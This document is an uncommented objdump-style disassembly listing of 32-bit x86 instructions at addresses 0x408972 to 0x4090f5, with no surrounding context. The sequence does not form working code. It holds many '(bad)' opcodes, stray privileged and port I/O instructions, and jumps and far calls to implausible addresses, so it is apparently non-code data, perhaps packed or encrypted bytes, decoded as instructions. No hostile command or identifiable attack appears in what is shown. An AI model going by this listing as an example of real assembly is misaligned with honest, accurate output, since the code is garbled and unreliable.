  408972:	test   DWORD PTR [eax-0x6a34a713],esp
  408978:	div    BYTE PTR [eax-0x55]
  40897b:	jb     0x4089fb
  40897d:	pop    edx
  40897e:	into   
  40897f:	adc    esi,DWORD PTR [ebp+0x57f53ddd]
  408985:	pop    ecx
  408986:	cld    
  408987:	test   al,0xad
  408989:	mov    eax,DWORD PTR [esi]
  40898b:	ds cdq 
  40898d:	push   esp
  40898e:	fsubr  QWORD PTR [eax+0x5f]
  408991:	adc    DWORD PTR [ebx-0x67371174],0x708cefde
  40899b:	or     DWORD PTR [ebx+edx*4],0xbe13ecf6
  4089a2:	popf   
  4089a3:	push   esi
  4089a4:	pop    ebx
  4089a5:	rcr    edi,0xa
  4089a8:	stos   DWORD PTR es:[edi],eax
  4089a9:	mov    al,0xf2
  4089ab:	pop    eax
  4089ac:	pusha  
  4089ad:	dec    ebp
  4089ae:	mov    BYTE PTR [ebx-0x3c79ae13],bl
  4089b4:	jp     0x408a15
  4089b6:	scas   al,BYTE PTR es:[edi]
  4089b7:	sbb    ebp,ecx
  4089b9:	mov    esi,0x4b31559d
  4089be:	xor    BYTE PTR [eax+0x666ab4aa],dh
  4089c4:	ret    0x25dc
  4089c7:	out    0x9d,eax
  4089c9:	mov    ebx,0xae1eb464
  4089ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089cf:	in     eax,dx
  4089d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089d1:	sti    
  4089d2:	ss ds call 0x8d3ff34c
  4089d9:	aas    
  4089da:	cmp    esi,eax
  4089dc:	push   ss
  4089dd:	fstp   TBYTE PTR [ecx-0x3e5a21d4]
  4089e3:	test   al,0x1d
  4089e5:	sti    
  4089e6:	sub    al,BYTE PTR [ecx]
  4089e8:	cmp    BYTE PTR [ecx+0x1d],bl
  4089eb:	loopne 0x40899d
  4089ed:	xchg   BYTE PTR [edx+edx*1],ch
  4089f0:	pop    edi
  4089f1:	mov    esp,ds
  4089f3:	push   es
  4089f4:	inc    eax
  4089f5:	in     al,dx
  4089f6:	out    dx,al
  4089f7:	ds or  ebx,ebx
  4089fa:	push   cs
  4089fb:	mov    esp,0xd43b7431
  408a00:	in     eax,dx
  408a01:	(bad)  
  408a02:	int3   
  408a03:	icebp  
  408a04:	mov    BYTE PTR [edx-0x16],dl
  408a07:	inc    ebp
  408a08:	int    0x60
  408a0a:	add    al,0xf3
  408a0c:	xor    bl,BYTE PTR [ebp-0x2b]
  408a0f:	aam    0x34
  408a11:	mov    DWORD PTR [edx+esi*1+0x15],esi
  408a15:	jno    0x408a56
  408a17:	xor    ecx,DWORD PTR [eax-0x1ebbf1aa]
  408a1d:	pop    ecx
  408a1e:	mov    eax,0x90a37039
  408a23:	inc    esi
  408a24:	fidiv  WORD PTR [ebx+0x63a938ac]
  408a2a:	sbb    eax,0x6d520cdf
  408a2f:	lock mov ax,0x1352
  408a34:	fisub  DWORD PTR [edx]
  408a36:	int3   
  408a37:	mov    bl,0x76
  408a39:	fdiv   DWORD PTR [esi]
  408a3b:	xor    BYTE PTR [eax-0x3b],dh
  408a3e:	jb     0x408a67
  408a40:	xor    al,0x18
  408a42:	jns    0x4089d1
  408a44:	push   ebp
  408a45:	pop    si
  408a47:	or     dh,al
  408a49:	mov    al,ds:0xc63c7c9b
  408a4e:	cs ja  0x408a7e
  408a51:	fstp   QWORD PTR [ebp-0x5fc0e54b]
  408a57:	fstp   QWORD PTR [eax+0x5846e446]
  408a5d:	push   cs
  408a5e:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  408a60:	in     al,dx
  408a61:	arpl   WORD PTR [edi-0x67f3cc87],cx
  408a67:	and    bh,BYTE PTR [ebp-0x14797c3f]
  408a6d:	mov    ebx,0x3d9930fb
  408a72:	out    dx,al
  408a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a74:	rol    DWORD PTR [ebx+0xe2b0ca1],cl
  408a7a:	addr16 push cs
  408a7c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408a7e:	scas   al,BYTE PTR es:[edi]
  408a7f:	or     eax,DWORD PTR [ebx-0x35]
  408a82:	fld    TBYTE PTR [eax+0x9]
  408a85:	aam    0x22
  408a87:	outs   dx,DWORD PTR ds:[esi]
  408a88:	mov    ds:0x22eb657c,eax
  408a8d:	out    0x94,al
  408a8f:	xlat   BYTE PTR ds:[ebx]
  408a90:	out    dx,al
  408a91:	sub    BYTE PTR [esi+eiz*8+0x47e0d7b],bl
  408a98:	les    ebp,FWORD PTR [ebp+0x3]
  408a9b:	imul   ebx,DWORD PTR [esi-0x7f],0x3d225409
  408aa2:	and    edx,0x2f
  408aa5:	retf   
  408aa6:	mov    bl,0x8b
  408aa8:	(bad)  
  408aa9:	outs   dx,BYTE PTR ds:[esi]
  408aaa:	pop    eax
  408aab:	nop
  408aac:	fs enter 0x953a,0xb9
  408ab1:	inc    esi
  408ab2:	bound  eax,QWORD PTR [ebx-0x61]
  408ab5:	stos   DWORD PTR es:[edi],eax
  408ab6:	adc    eax,0xfd529b2c
  408abb:	jne    0x408ac3
  408abd:	lock add al,BYTE PTR [edi]
  408ac0:	jb     0x408a8d
  408ac2:	xchg   ecx,eax
  408ac3:	loopne 0x408acc
  408ac5:	mov    esi,0xa232ac6f
  408aca:	dec    esp
  408acb:	adc    BYTE PTR [edx],dh
  408acd:	add    dh,BYTE PTR [eax-0x150c81e1]
  408ad3:	push   0xfffffffa
  408ad5:	in     al,dx
  408ad6:	xchg   ecx,eax
  408ad7:	pop    eax
  408ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ad9:	pusha  
  408ada:	add    al,0xff
  408adc:	cdq    
  408add:	or     eax,eax
  408adf:	nop
  408ae0:	dec    ebp
  408ae1:	push   edx
  408ae2:	pop    ecx
  408ae3:	dec    edi
  408ae4:	xchg   esi,eax
  408ae5:	jmp    0x408a9f
  408ae7:	xor    eax,0xd46bc9d5
  408aec:	xchg   esi,eax
  408aed:	cmp    DWORD PTR ds:0x44bd52f2,edi
  408af3:	retf   0x662d
  408af6:	mov    al,ds:0xa5390629
  408afb:	dec    ecx
  408afc:	lea    esi,[ecx+edi*1-0x44]
  408b00:	das    
  408b01:	jp     0x408b68
  408b03:	sbb    BYTE PTR [edx],cl
  408b05:	dec    ebx
  408b06:	scas   al,BYTE PTR es:[edi]
  408b07:	out    0x14,al
  408b09:	mov    eax,ds:0x69a6570
  408b0e:	(bad)  
  408b0f:	loopne 0x408ae8
  408b11:	cmp    eax,0xd3495605
  408b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b17:	dec    edx
  408b18:	ds pop esi
  408b1a:	push   ds
  408b1b:	cmp    eax,0x1449e4e1
  408b20:	adc    ebx,DWORD PTR [esi+0x31]
  408b23:	jns    0x408ab8
  408b25:	js     0x408b97
  408b27:	int    0xe8
  408b29:	mov    ds:0x68078278,eax
  408b2e:	hlt    
  408b2f:	push   edx
  408b30:	cmp    eax,0x89759c5f
  408b35:	sub    al,0x51
  408b37:	cwde   
  408b38:	jnp    0x408ac7
  408b3a:	dec    esp
  408b3b:	xor    ebx,edi
  408b3d:	popa   
  408b3e:	mov    al,0x75
  408b40:	pop    esi
  408b41:	sub    DWORD PTR [edi],edi
  408b43:	fdivr  DWORD PTR [ebx+0x7a]
  408b46:	(bad)  
  408b47:	jmp    0x408b3f
  408b49:	pop    ebx
  408b4a:	in     al,0x37
  408b4c:	jno    0x408b1e
  408b4e:	mov    bl,0x1a
  408b50:	cmp    esp,ebp
  408b52:	mov    DWORD PTR [edx+0x34],0xe784b93a
  408b59:	or     BYTE PTR [eax],ch
  408b5b:	jge    0x408b87
  408b5d:	xchg   BYTE PTR [edx-0x37a99493],ah
  408b63:	pusha  
  408b64:	jecxz  0x408b9a
  408b66:	data16 shl BYTE PTR [eax+0x4bcbfeef],1
  408b6d:	fistp  WORD PTR ds:0xfe52da47
  408b73:	xchg   edx,eax
  408b74:	mov    dh,BYTE PTR [eax-0x20]
  408b77:	jae    0x408b2c
  408b79:	push   ebx
  408b7a:	push   0x5ee049be
  408b7f:	ret    
  408b80:	cld    
  408b81:	cmp    dl,BYTE PTR [edi]
  408b83:	ins    BYTE PTR es:[edi],dx
  408b84:	lods   al,BYTE PTR ds:[esi]
  408b85:	in     al,0xba
  408b87:	test   eax,0xbff1d161
  408b8c:	cmp    eax,0x58d0bb5e
  408b91:	pop    ss
  408b92:	(bad)  
  408b93:	sbb    edi,ecx
  408b95:	sbb    dh,BYTE PTR [ecx-0x2b]
  408b98:	mov    BYTE PTR [edx],dl
  408b9a:	jns    0x408ba3
  408b9c:	push   esi
  408b9d:	inc    ecx
  408b9e:	add    eax,0x3633d2b3
  408ba3:	pop    esi
  408ba4:	pop    es
  408ba5:	push   ebx
  408ba6:	jb     0x408c04
  408ba8:	mov    dh,0xff
  408baa:	xor    eax,0x84adf3de
  408baf:	mov    bh,0x30
  408bb1:	fcmovnbe st,st(0)
  408bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bb4:	xchg   ecx,eax
  408bb5:	xchg   ebx,eax
  408bb6:	xor    eax,0x7a4ef6d4
  408bbb:	js     0x408b73
  408bbd:	mov    BYTE PTR [ecx+0x56],ah
  408bc0:	adc    cl,cl
  408bc2:	inc    edi
  408bc3:	sbb    eax,0xfa86e0d5
  408bc8:	aaa    
  408bc9:	dec    ecx
  408bca:	sar    ecx,1
  408bcc:	imul   esp,DWORD PTR [edi+0x6],0x9e58f3d4
  408bd3:	aam    0x8a
  408bd5:	inc    edi
  408bd6:	xor    eax,0x4ce317e
  408bdb:	lea    edx,[ecx+ebx*4-0x6d]
  408bdf:	jle    0x408be8
  408be1:	stos   DWORD PTR es:[edi],eax
  408be2:	and    bl,BYTE PTR [edx-0x3a33c0df]
  408be8:	push   0xffffffb4
  408bea:	push   esp
  408beb:	sub    BYTE PTR [ebx+0x76],ch
  408bee:	sbb    ch,BYTE PTR [edx-0x62b8b353]
  408bf4:	stos   DWORD PTR es:[edi],eax
  408bf5:	setg   BYTE PTR [eax]
  408bf8:	push   eax
  408bf9:	stos   DWORD PTR es:[edi],eax
  408bfa:	inc    edi
  408bfb:	stos   DWORD PTR es:[edi],eax
  408bfc:	sbb    BYTE PTR [edi-0x6d],cl
  408bff:	sbb    al,0x26
  408c01:	(bad)  
  408c02:	mov    ecx,0xa82c8024
  408c07:	in     eax,dx
  408c08:	xor    eax,0xb9f412b6
  408c0d:	inc    ecx
  408c0e:	fcom   st(2)
  408c10:	push   cs
  408c11:	sub    ch,BYTE PTR [eax+0x6c]
  408c14:	mov    al,ds:0x30200f62
  408c19:	adc    ah,BYTE PTR [ebp+0x6d4c6a3]
  408c1f:	xchg   ecx,eax
  408c20:	mov    cl,ah
  408c22:	ja     0x408c63
  408c24:	xchg   ebp,eax
  408c25:	adc    cl,ah
  408c27:	retf   0x7044
  408c2a:	xchg   DWORD PTR [eax],ebx
  408c2c:	adc    al,0xbf
  408c2e:	pop    ebx
  408c2f:	and    DWORD PTR [ecx-0x303186c2],ebx
  408c35:	daa    
  408c36:	inc    edi
  408c37:	cmc    
  408c38:	and    dl,cl
  408c3a:	fwait
  408c3b:	js     0x408c80
  408c3d:	stos   BYTE PTR es:[edi],al
  408c3e:	mov    ecx,0x3a7edaeb
  408c43:	dec    eax
  408c44:	mov    edi,0xd20f20e3
  408c49:	dec    esi
  408c4a:	(bad)  
  408c4b:	or     DWORD PTR [ecx],ebp
  408c4d:	xchg   esp,eax
  408c4e:	and    BYTE PTR ds:0x8c24e4ab,dl
  408c54:	(bad)  
  408c55:	pop    eax
  408c56:	push   cs
  408c57:	jmp    0x133e:0xe5b686b0
  408c5e:	clc    
  408c5f:	push   ds
  408c60:	fldenv [ebx]
  408c62:	repz and eax,eax
  408c65:	add    cl,bl
  408c67:	add    DWORD PTR [edi],ebp
  408c69:	and    al,0x37
  408c6b:	sbb    BYTE PTR [edx+ecx*1-0x1f26102],dl
  408c72:	std    
  408c73:	outs   dx,BYTE PTR ds:[esi]
  408c74:	es icebp 
  408c76:	cmp    eax,0x1f7e9a5d
  408c7b:	pop    ecx
  408c7c:	(bad)  
  408c7d:	jmp    DWORD PTR [esi+eax*2+0x43778329]
  408c84:	mov    BYTE PTR [eax+0x3a6835f1],cl
  408c8a:	pop    es
  408c8b:	push   ebp
  408c8c:	mov    ds:0x6179ef10,al
  408c91:	push   eax
  408c92:	pop    ecx
  408c93:	retf   
  408c94:	aas    
  408c95:	fs add al,0x49
  408c98:	sti    
  408c99:	adc    DWORD PTR [ecx],esp
  408c9b:	add    DWORD PTR [ebx+ebx*8+0x57],ebx
  408c9f:	xchg   esp,edx
  408ca1:	lds    esp,FWORD PTR [ebx-0x77]
  408ca4:	xor    DWORD PTR [ebx],ecx
  408ca6:	into   
  408ca7:	sbb    eax,0xb9f3c683
  408cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cad:	sub    BYTE PTR [esi],al
  408caf:	dec    eax
  408cb0:	mov    dl,0xb9
  408cb2:	cmp    BYTE PTR [edx+0x757dcfbf],bh
  408cb8:	dec    eax
  408cb9:	xchg   DWORD PTR [esp+ebx*8-0x5607a9de],esi
  408cc0:	sbb    dl,dh
  408cc2:	adc    eax,0xf33740af
  408cc7:	(bad)  
  408cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cc9:	jns    0x408c93
  408ccb:	inc    edi
  408ccc:	jge    0x408d37
  408cce:	call   0xc1fa7e52
  408cd3:	test   ah,ah
  408cd5:	pushf  
  408cd6:	adc    al,bl
  408cd8:	out    dx,al
  408cd9:	ins    BYTE PTR es:[edi],dx
  408cda:	pop    es
  408cdb:	fist   DWORD PTR [ebx]
  408cdd:	mov    bh,0x6a
  408cdf:	pop    esi
  408ce0:	out    dx,eax
  408ce1:	sub    eax,0x55ba51be
  408ce6:	jmp    0xff0375dc
  408ceb:	(bad)  
  408ced:	sar    BYTE PTR [edi+0x14],0xe5
  408cf1:	dec    edx
  408cf2:	lea    esp,[ecx-0x65c617ae]
  408cf8:	dec    esi
  408cf9:	add    DWORD PTR [eax],0xffffffc7
  408cfc:	xchg   edx,eax
  408cfd:	jle    0x408c92
  408cff:	mov    BYTE PTR [esi-0x2f6571a8],dh
  408d05:	or     esp,ebx
  408d07:	push   ss
  408d08:	and    BYTE PTR [ebx+eax*2+0xcee5c80],bh
  408d0f:	loop   0x408d3b
  408d11:	inc    edi
  408d12:	jne    0x408caf
  408d14:	les    esp,FWORD PTR [ebp+0x4d493017]
  408d1a:	xchg   edx,eax
  408d1b:	js     0x408d2f
  408d1d:	push   eax
  408d1e:	pop    ecx
  408d1f:	clc    
  408d20:	(bad)  
  408d21:	aas    
  408d22:	pop    edx
  408d23:	jmp    0x8b2b:0x705148ed
  408d2a:	pop    edi
  408d2b:	jecxz  0x408da6
  408d2d:	mov    al,ds:0x49bfb9e3
  408d32:	pop    ebx
  408d33:	aad    0x4b
  408d35:	push   DWORD PTR [edx+0x282afe6a]
  408d3b:	ret    
  408d3c:	ds nop
  408d3e:	(bad)  
  408d3f:	aaa    
  408d40:	cdq    
  408d41:	(bad)  
  408d42:	push   edx
  408d43:	jo     0x408ce5
  408d45:	hlt    
  408d46:	sar    al,0xc2
  408d49:	loop   0x408d2e
  408d4b:	or     ch,ah
  408d4d:	test   DWORD PTR [eax-0x25],ebx
  408d50:	push   edi
  408d51:	add    eax,0x49af4523
  408d56:	or     BYTE PTR [esi-0x68],dl
  408d59:	das    
  408d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d5b:	ret    0x71d1
  408d5e:	popf   
  408d5f:	or     al,0x1
  408d61:	inc    esi
  408d62:	mov    ah,0x7d
  408d64:	fsubr  DWORD PTR [edx]
  408d66:	mov    edi,DWORD PTR [ebx]
  408d68:	adc    DWORD PTR [edi],esp
  408d6a:	xor    ah,dl
  408d6c:	xchg   DWORD PTR [eax+0x1e],ebx
  408d6f:	(bad)  
  408d70:	xchg   edi,eax
  408d71:	inc    edi
  408d72:	and    eax,0xd18d49f4
  408d77:	dec    eax
  408d78:	das    
  408d79:	stc    
  408d7a:	xor    BYTE PTR [edi+0x3a],0xf0
  408d7e:	mov    ch,0x85
  408d80:	shl    DWORD PTR [esi],cl
  408d82:	cmp    edi,edx
  408d84:	mov    ebp,DWORD PTR [esi]
  408d86:	test   DWORD PTR [edi],esi
  408d88:	pop    ebp
  408d89:	aaa    
  408d8a:	stos   BYTE PTR es:[edi],al
  408d8b:	sbb    al,0xf9
  408d8d:	arpl   WORD PTR [ebx-0x4],dx
  408d90:	retf   
  408d91:	jnp    0x408d5e
  408d93:	pushw  ss
  408d95:	or     dh,ah
  408d97:	lock xor bh,bl
  408d9a:	pop    ss
  408d9b:	(bad)  [ebp-0x36]
  408d9e:	daa    
  408d9f:	pop    eax
  408da0:	mov    bh,0x38
  408da2:	enter  0xb30b,0x2e
  408da6:	jl     0x408e1e
  408da8:	xchg   DWORD PTR [ebx+ecx*4+0x3a112bd7],ecx
  408daf:	jo     0x408e13
  408db1:	cmp    BYTE PTR [ecx],cl
  408db3:	retf   0x54ee
  408db6:	push   0xffffff84
  408db8:	adc    DWORD PTR [edi-0x2a],0x62
  408dbc:	int3   
  408dbd:	cli    
  408dbe:	jbe    0x408d45
  408dc0:	pop    esi
  408dc1:	mov    bh,0x83
  408dc3:	mov    ah,0x42
  408dc5:	and    eax,0x2ef6433a
  408dca:	std    
  408dcb:	jmp    0xb1fb:0xa0e74021
  408dd2:	push   0x3d
  408dd4:	mov    ecx,0x7940b502
  408dd9:	jl     0x408dea
  408ddb:	pop    ebx
  408ddc:	sub    al,0xda
  408dde:	retf   
  408ddf:	jle    0x408e0e
  408de1:	movhps xmm3,QWORD PTR [ebx-0x449029ed]
  408de8:	and    cl,dl
  408dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408deb:	and    edi,DWORD PTR [eax-0x3d]
  408dee:	call   0x2a73dee9
  408df3:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408df5:	xchg   ecx,eax
  408df6:	mul    DWORD PTR [esi+0x35]
  408df9:	dec    esp
  408dfa:	pop    edx
  408dfc:	mov    esp,0xb7aad797
  408e01:	inc    edx
  408e02:	adc    eax,0xacb86482
  408e07:	call   0x94ae:0x60cc6db9
  408e0e:	(bad)  
  408e0f:	xchg   ebp,eax
  408e10:	pop    ebx
  408e11:	retf   0x94c
  408e14:	and    esi,DWORD PTR [edi+ebp*2]
  408e17:	fst    DWORD PTR [ebx]
  408e19:	out    0x97,al
  408e1b:	mov    cl,0x94
  408e1d:	stos   DWORD PTR es:[edi],eax
  408e1e:	lods   eax,DWORD PTR ds:[esi]
  408e1f:	mov    ch,BYTE PTR [esi]
  408e21:	es dec edx
  408e23:	pop    esp
  408e24:	clc    
  408e25:	ror    BYTE PTR ds:0x7325e3,1
  408e2b:	fist   WORD PTR [edi+0x67]
  408e2e:	jmp    0x602e:0x9d6b65
  408e35:	pop    eax
  408e36:	out    dx,al
  408e37:	jge    0x408ea9
  408e39:	jl     0x408e23
  408e3b:	sar    DWORD PTR [ebx-0x3],cl
  408e3e:	into   
  408e3f:	test   DWORD PTR [ebp-0x35],esi
  408e42:	inc    ebp
  408e43:	aad    0x64
  408e45:	adc    al,0xb7
  408e47:	js     0x408e76
  408e49:	in     eax,dx
  408e4a:	imul   eax,eax,0xfffffffb
  408e4d:	mov    ebx,DWORD PTR [edx-0x8]
  408e50:	(bad)  [esi-0x3c8513a5]
  408e56:	and    edi,DWORD PTR [edx+0x62b5054b]
  408e5c:	(bad)  
  408e5d:	jmp    0x2332:0x299a5ac1
  408e64:	fs mov esp,0xbc666494
  408e6a:	rcl    BYTE PTR [ebp+0x47],0xc4
  408e6e:	mov    ds:0x1501a465,al
  408e73:	push   esi
  408e74:	and    al,BYTE PTR [esi]
  408e76:	test   dh,bl
  408e78:	lods   al,BYTE PTR ds:[esi]
  408e79:	dec    ebp
  408e7a:	dec    ecx
  408e7b:	sub    eax,DWORD PTR [edx-0x74]
  408e7e:	ins    DWORD PTR es:[edi],dx
  408e7f:	paddd  mm3,QWORD PTR [eax]
  408e82:	test   al,0x7c
  408e84:	test   al,0x5
  408e86:	xchg   ebp,eax
  408e87:	repnz mov ds:0x5167e7a6,eax
  408e8d:	les    eax,FWORD PTR [ecx-0x4d]
  408e90:	int    0x67
  408e92:	sbb    DWORD PTR [ecx],edx
  408e94:	push   ss
  408e95:	mov    dl,0x49
  408e97:	jmp    0xf49ce9db
  408e9c:	lods   eax,DWORD PTR ds:[esi]
  408e9d:	in     eax,dx
  408e9e:	push   es
  408e9f:	call   DWORD PTR [ebx]
  408ea1:	jmp    0x408ee0
  408ea3:	xor    dl,BYTE PTR cs:[edi-0x1f1e0dce]
  408eaa:	mov    ebx,0x7acce579
  408eaf:	xor    al,0xd4
  408eb1:	loop   0x408f07
  408eb3:	not    DWORD PTR [eax-0x425bf63d]
  408eb9:	adc    DWORD PTR [esi-0x2a],eax
  408ebc:	sbb    BYTE PTR [esi-0x51],0x6b
  408ec0:	icebp  
  408ec1:	out    0xe0,al
  408ec3:	inc    esp
  408ec4:	mov    ds:0x58d12215,eax
  408ec9:	cmp    al,0xf4
  408ecb:	mov    bl,BYTE PTR [edi-0x3c9859f]
  408ed1:	mov    al,0x4b
  408ed3:	mov    ds:0xf6455a43,al
  408ed8:	and    DWORD PTR [edx-0x1a309f92],edx
  408ede:	(bad)  
  408ee0:	or     ah,BYTE PTR [esi]
  408ee2:	mov    dh,0xf
  408ee4:	out    dx,eax
  408ee5:	hlt    
  408ee6:	push   0xffffffc8
  408ee8:	xor    al,0x85
  408eea:	sub    BYTE PTR [edi],ch
  408eec:	lock pop eax
  408eee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eef:	push   esi
  408ef0:	mov    dl,0x7
  408ef2:	push   es
  408ef3:	fcomip st,st(6)
  408ef5:	daa    
  408ef6:	(bad)  
  408ef7:	jae    0x408e7f
  408ef9:	fisttp WORD PTR [esi-0x27]
  408efc:	sub    al,0x82
  408efe:	(bad)  
  408eff:	sbb    eax,DWORD PTR ds:0xd808a98f
  408f05:	sbb    BYTE PTR [edx],0x91
  408f08:	add    cl,BYTE PTR [edi+0x3d]
  408f0b:	data16 mov ah,0xf3
  408f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f0f:	sbb    ah,BYTE PTR gs:[ecx+0x437ff521]
  408f16:	int    0xd4
  408f18:	mov    al,ds:0xf7045ff7
  408f1d:	dec    esi
  408f1e:	(bad)  
  408f1f:	popa   
  408f20:	dec    ebp
  408f21:	sbb    ebx,DWORD PTR [ecx]
  408f23:	test   al,0xf
  408f25:	jmp    0x7eb6e7a3
  408f2a:	push   0xffffffe9
  408f2c:	test   DWORD PTR [esi+0x263bb998],eax
  408f32:	lahf   
  408f33:	mov    al,0xf9
  408f35:	jne    0x408eee
  408f37:	jo     0x408ee4
  408f39:	jno    0x408f87
  408f3b:	xchg   edx,eax
  408f3c:	jp     0x408f66
  408f3e:	mov    al,BYTE PTR [ebx+0x62f92c14]
  408f44:	shrd   DWORD PTR [ebx-0x53],ebx,cl
  408f48:	in     eax,dx
  408f49:	push   es
  408f4a:	or     DWORD PTR [edx-0x61],edx
  408f4d:	mov    esi,0xb7d40806
  408f52:	int    0x10
  408f54:	dec    edi
  408f55:	test   al,0xb
  408f57:	fcom   QWORD PTR [ebx-0x23]
  408f5a:	dec    esp
  408f5b:	push   0x5
  408f5d:	cmp    BYTE PTR ds:0x3783c70b,dl
  408f63:	jmp    0xaf3c:0x29abe354
  408f6a:	cmp    ebp,DWORD PTR [edx+0x704411ca]
  408f70:	cmp    eax,0xafb6f587
  408f75:	in     eax,0x0
  408f77:	test   DWORD PTR [ebx+ebp*1-0x46155cc8],ebp
  408f7e:	mov    eax,ds:0xbe572fdc
  408f83:	jno    0x408f8b
  408f85:	sahf   
  408f86:	stos   DWORD PTR es:[edi],eax
  408f87:	push   ecx
  408f88:	(bad)  
  408f89:	sub    BYTE PTR [edi-0x5],al
  408f8c:	push   esi
  408f8d:	daa    
  408f8e:	in     eax,0x46
  408f90:	aas    
  408f91:	inc    eax
  408f92:	add    al,0xfe
  408f94:	xchg   esp,eax
  408f95:	xor    BYTE PTR [eax+edi*4-0xe],al
  408f99:	out    dx,eax
  408f9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f9b:	fst    DWORD PTR [esi+0x4b73a3e4]
  408fa1:	lods   eax,DWORD PTR ds:[esi]
  408fa2:	dec    ebp
  408fa3:	push   ds
  408fa4:	pop    eax
  408fa5:	ins    DWORD PTR es:[edi],dx
  408fa6:	aam    0x4
  408fa8:	aas    
  408fa9:	arpl   WORD PTR [edx+0x55],dx
  408fac:	fwait
  408fad:	jnp    0x408fd2
  408faf:	xchg   BYTE PTR [ebx-0x3f802dd8],ch
  408fb5:	pop    ebp
  408fb6:	stc    
  408fb7:	aad    0x15
  408fb9:	mov    bh,0xe2
  408fbb:	mov    al,0x90
  408fbd:	mov    es,WORD PTR [ebp+0x20df9a79]
  408fc3:	push   esi
  408fc4:	loope  0x408fa6
  408fc6:	jecxz  0x409008
  408fc8:	dec    esi
  408fc9:	or     al,ch
  408fcb:	lahf   
  408fcc:	xor    cl,0x38
  408fcf:	and    eax,0xc2cbc92a
  408fd4:	mov    ss,WORD PTR [ecx+0x3]
  408fd7:	jbe    0x408f99
  408fd9:	pop    ebp
  408fda:	dec    esp
  408fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fdc:	int    0xaf
  408fde:	push   es
  408fdf:	fdivr  QWORD PTR [ebx]
  408fe1:	mov    WORD PTR [ebp-0x39],fs
  408fe4:	std    
  408fe5:	jns    0x409057
  408fe7:	jmp    0x408f72
  408fe9:	add    al,0x41
  408feb:	sbb    eax,0xeb033b4f
  408ff0:	test   DWORD PTR [ebx+0x4b8e497b],edx
  408ff6:	inc    ecx
  408ff7:	push   ds
  408ff8:	out    dx,eax
  408ff9:	popf   
  408ffa:	loop   0x40905f
  408ffc:	fisubr DWORD PTR [edi+0x440496c4]
  409002:	not    ch
  409004:	mov    dh,0x78
  409006:	sub    DWORD PTR [edi+0x1a23c871],esp
  40900c:	ss nop
  40900e:	cmp    eax,0x70cacb80
  409013:	cmc    
  409014:	xchg   ebx,eax
  409015:	ja     0x409063
  409017:	and    DWORD PTR [edx-0x5e],esp
  40901a:	sahf   
  40901b:	mov    gs,esi
  40901d:	mov    ch,0xb2
  40901f:	xor    BYTE PTR [edx-0x10a88c51],dl
  409025:	or     dl,BYTE PTR [esi-0x6356dbfa]
  40902b:	shl    DWORD PTR ds:0x8541aab6,cl
  409031:	push   edx
  409032:	scas   al,BYTE PTR es:[edi]
  409033:	fadd   QWORD PTR [ebx]
  409035:	adc    esp,DWORD PTR [esi+0x33]
  409038:	dec    ebx
  409039:	push   eax
  40903a:	bound  ecx,QWORD PTR [eax+0x1f952bc9]
  409040:	sbb    BYTE PTR [eax],0x59
  409043:	mov    esi,0x5d622f5c
  409048:	cli    
  409049:	gs hlt 
  40904b:	mov    al,0xb
  40904d:	adc    BYTE PTR [ebx],bl
  40904f:	cmc    
  409050:	or     ecx,DWORD PTR ds:0x8fce175a
  409056:	jmp    0xb5907676
  40905b:	out    dx,eax
  40905c:	xlat   BYTE PTR ds:[ebx]
  40905d:	test   DWORD PTR [edx-0x22b8ea96],edi
  409063:	adc    esi,DWORD PTR [edi+0x7b00386f]
  409069:	das    
  40906a:	iret   
  40906b:	xor    al,0xc9
  40906d:	vpmullw ymm6,ymm3,YMMWORD PTR [esi+eax*8]
  409072:	add    ah,bh
  409074:	lea    esi,[edi+ebx*8+0xc0bc45b]
  40907b:	cld    
  40907c:	aas    
  40907d:	outs   dx,DWORD PTR ds:[esi]
  40907e:	fisttp WORD PTR [edi]
  409080:	jl     0x409005
  409082:	repz neg DWORD PTR [edi+0x3d391c10]
  409089:	xlat   BYTE PTR ds:[ebx]
  40908a:	mov    ah,0x74
  40908c:	retf   0x5925
  40908f:	push   0x55a696c9
  409094:	jmp    FWORD PTR [esi-0xd]
  409097:	jbe    0x409117
  409099:	pop    ds
  40909a:	jnp    0x409075
  40909c:	cmp    al,0x24
  40909e:	push   ecx
  40909f:	(bad)  
  4090a0:	fsubrp st(1),st
  4090a2:	test   al,0xee
  4090a4:	push   ecx
  4090a5:	imul   ebp,edx,0xffffffbd
  4090a8:	sbb    al,0x6
  4090aa:	arpl   WORD PTR [ecx-0x745aab24],di
  4090b0:	mov    edx,0xaf27a3fe
  4090b5:	jno    0x4090c1
  4090b7:	push   es
  4090b8:	push   ebp
  4090b9:	cli    
  4090ba:	fistp  WORD PTR [ebp+0x2c078d42]
  4090c0:	xor    dl,BYTE PTR [eax+0x3b9767fd]
  4090c6:	ja     0x40906e
  4090c8:	xor    edi,DWORD PTR [esi-0x4f5898e8]
  4090ce:	sahf   
  4090cf:	ds and dl,dl
  4090d2:	xchg   esi,eax
  4090d3:	cmp    DWORD PTR [eax],edx
  4090d5:	clc    
  4090d6:	mov    ds:0xff737c05,eax
  4090db:	sub    edi,DWORD PTR [ecx-0x25]
  4090de:	jb     0x4090ce
  4090e0:	or     al,0x4d
  4090e2:	pop    ebp
  4090e3:	pop    eax
  4090e4:	jns    0x409157
  4090e6:	xor    esi,edi
  4090e8:	inc    ecx
  4090e9:	cli    
  4090ea:	popa   
  4090eb:	fidivr DWORD PTR [ebp-0x41]
  4090ee:	jo     0x409132
  4090f0:	and    eax,0xc3ad19f9
  4090f5:	mov    DWORD PTR [esi+0x6a5c0ce4],ecx
